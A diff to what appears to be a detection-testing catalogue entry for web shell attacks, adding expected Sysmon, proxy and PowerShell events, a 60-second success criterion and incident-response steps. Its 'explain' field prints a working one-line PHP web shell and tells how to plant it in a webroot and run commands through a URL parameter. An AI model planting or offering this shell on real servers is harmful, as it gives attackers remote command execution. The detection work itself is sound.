@@ -164,6 +164,39 @@
         "proxy",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "powershell",
+          "description": "Web Shell Payloads - Sentinel"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "1",
+          "description": "Process creation (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "11",
+          "description": "File created (Sysmon)"
+        },
+        {
+          "source": "proxy",
+          "description": "web_shell_execution"
+        },
+        {
+          "source": "sysmon",
+          "description": "file_event_web_shell_written"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review PowerShell Script Block / Module Logs, Sysmon, Web proxy logs for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "A one-line web shell that runs OS commands from a URL parameter:\n  <?php system($_REQUEST[\"cmd\"]); ?>   execute whatever is passed as the 'cmd' parameter\nDrop it into the webroot (echo it to shell.php), then hit /shell.php?cmd=id to run commands as the web-server user; pick the language matching the app (PHP/JSP/ASP)."
